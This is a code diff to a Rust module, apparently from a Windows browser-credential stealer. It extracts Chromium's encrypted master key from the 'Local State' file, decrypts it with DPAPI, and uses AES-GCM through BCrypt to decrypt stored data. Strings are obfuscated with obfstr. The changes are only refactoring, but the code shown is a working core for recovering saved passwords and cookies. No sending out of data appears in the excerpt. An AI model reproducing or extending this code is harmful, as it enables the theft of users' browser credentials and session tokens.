@@ -1,4 +1,4 @@
-use crate::base64::{base64_decode_string};
+use crate::base64::base64_decode_string;
 use crate::path::Path;
 use alloc::string::{String, ToString};
 use alloc::vec::Vec;
@@ -7,8 +7,8 @@ use core::ptr::null_mut;
 use core::slice;
 use json::parse;
 use obfstr::obfstr as s;
-use windows_sys::Win32::Foundation::{LocalFree};
-use windows_sys::Win32::Security::Cryptography::{BCryptCloseAlgorithmProvider, BCryptDecrypt, BCryptDestroyKey, BCryptGenerateSymmetricKey, BCryptOpenAlgorithmProvider, BCryptSetProperty, CryptUnprotectData, BCRYPT_AES_ALGORITHM, BCRYPT_ALG_HANDLE, BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_GCM, BCRYPT_KEY_HANDLE, CRYPT_INTEGER_BLOB};
+use windows_sys::Win32::Foundation::LocalFree;
+use windows_sys::Win32::Security::Cryptography::{BCryptCloseAlgorithmProvider, BCryptDecrypt, BCryptDestroyKey, BCryptGenerateSymmetricKey, BCryptOpenAlgorithmProvider, BCryptSetProperty, CryptUnprotectData, BCRYPT_AES_ALGORITHM, BCRYPT_ALG_HANDLE, BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO, BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_GCM, BCRYPT_KEY_HANDLE, CRYPT_INTEGER_BLOB};
 
 pub unsafe fn crypt_unprotect_data(data: &[u8]) -> Option<Vec<u8>> {
     let mut in_blob = CRYPT_INTEGER_BLOB {
@@ -88,11 +88,11 @@ pub unsafe fn decrypt_data(buffer: &[u8], master_key: &[u8]) -> Option<String> {
     let pb_tag = &buffer[buffer.len() - 16..];
 
     let mut auth_into: BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO = zeroed();
-    auth_into.cbSize = size_of::<BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO>() as _;
-    auth_into.dwInfoVersion = 1;
+    auth_into.cbSize = size_of::<BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO>() as u32;
+    auth_into.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
     auth_into.pbNonce = iv.as_mut_ptr();
-    auth_into.cbNonce = iv.len() as _;
-    auth_into.pbTag = pb_tag.as_ptr() as _;
+    auth_into.cbNonce = iv.len() as u32;
+    auth_into.pbTag = pb_tag.as_ptr() as *mut u8;
     auth_into.cbTag = 16;
     
     let mut decrypted = Vec::with_capacity(ciphertext.len());
@@ -136,7 +136,11 @@ pub unsafe fn extract_master_key(user_data: &Path) -> Option<Vec<u8>> {
     let bytes = (user_data / s!("Local State")).read_file().ok()?;
     let parsed = parse(&bytes).ok()?;
 
-    let key_in_base64 = parsed.get(s!("os_crypt"))?.get(s!("encrypted_key"))?.as_string()?.clone();
+    let key_in_base64 = parsed.get(s!("os_crypt"))
+        ?.get(s!("encrypted_key"))
+        ?.as_string()
+        ?.clone();
+    
     let key = base64_decode_string(&key_in_base64)?;
     let sliced_key = &key[5..];
     
